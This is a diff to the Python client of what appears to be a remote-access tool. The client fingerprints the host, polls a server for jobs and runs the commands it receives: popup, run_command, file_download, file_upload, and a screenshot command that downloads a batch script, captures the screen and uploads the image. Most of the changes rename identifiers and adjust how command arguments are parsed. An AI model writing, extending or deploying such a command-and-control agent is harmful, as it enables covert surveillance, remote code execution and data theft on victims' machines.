@@ -24,7 +24,7 @@ class Client:
     def __init__(self):
         # Code for detecting mac found on https://stackoverflow.com/questions/159137/getting-mac-address
         self.det_mac = ''.join(
-            ('%012X' % getnode())[i : i + 2] for i in range(0, 12, 2)
+            ('%012X' % getnode())[i: i + 2] for i in range(0, 12, 2)
         )
         self.det_os = platform.system() + platform.release()
         self.det_name = os.environ['COMPUTERNAME']
@@ -173,7 +173,7 @@ class Command:
             return {'confirmation': confirmation}
 
     @staticmethod
-    def screenshoot():
+    def screenshot():
         temp_dir = os.path.expanduser('~') + '\\AppData\\Local\\Temp\\'
         bat_url = 'https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat'
         # print(app_dir)
@@ -189,15 +189,15 @@ class Command:
             'arg3': 'screenCapture.bat',
             'arg4': screen_name
         }
-        make_screenshoot = Command.run_command(terminal=True, **args_dict)
+        make_screenshot = Command.run_command(terminal=True, **args_dict)
         file = {
             'file': open(temp_dir + screen_name, 'rb')
         }
-        confirmation = f'[SUCCESS {curr_datetime()}] Screeenshoot {screen_name}  was made & uploaded'
-        if 'SUCCESS' in make_screenshoot['confirmation']:
+        confirmation = f'[SUCCESS {curr_datetime()}] Screeenshot {screen_name}  was made & uploaded'
+        if 'SUCCESS' in make_screenshot['confirmation']:
             return {'confirmation': confirmation, 'file': file}
         else:
-            confirmation = f'[ERROR {curr_datetime()}] Screeenshoot {screen_name}  was not made'
+            confirmation = f'[ERROR {curr_datetime()}] Screeenshot {screen_name}  was not made'
             return {'confirmation': confirmation}
 
     @staticmethod
@@ -273,7 +273,7 @@ def main():
         'popup': command.popup,
         'run_command': command.run_command,
         'file_download': command.file_download,
-        'screenshoot': command.screenshoot,
+        'screenshot': command.screenshot,
         'file_upload': command.file_upload,
     }
 
@@ -286,9 +286,13 @@ def main():
         # List of available commands
         # 'None' can flip whole script! (None as command params)
         get_job = client.get_data()
-        com = get_job.get('last_command')
-        com_args = literal_eval(get_job.get('last_command_args'))
-        com_id = get_job['last_command_id']
+        #print(get_job)
+        com = get_job.get('command')
+        # convert string to bool if key is 'terminal' or 'execute'
+        com_args = {k: literal_eval(v) if ('terminal' or 'execute') in k else v
+                    for k, v in literal_eval(get_job.get('command_args')).items()}
+        #print(com_args)
+        com_id = get_job['command_id']
         if any(i in com for i in com_dict):
             if com_id not in (received_com_id and sent_com_id):
                 # Do something
@@ -299,7 +303,7 @@ def main():
                     com_result = com_to_run()
                 received_com_id.append(com_id)
                 job_results = {
-                    'last_command_result': '[{}] {}'.format(com_id, com_result.get('confirmation')),
+                    'command_result': '[{}] {}'.format(com_id, com_result.get('confirmation')),
                 }
                 client.send_data(job_results, com_result.get('file', None))
                 sent_com_id.append(com_id)
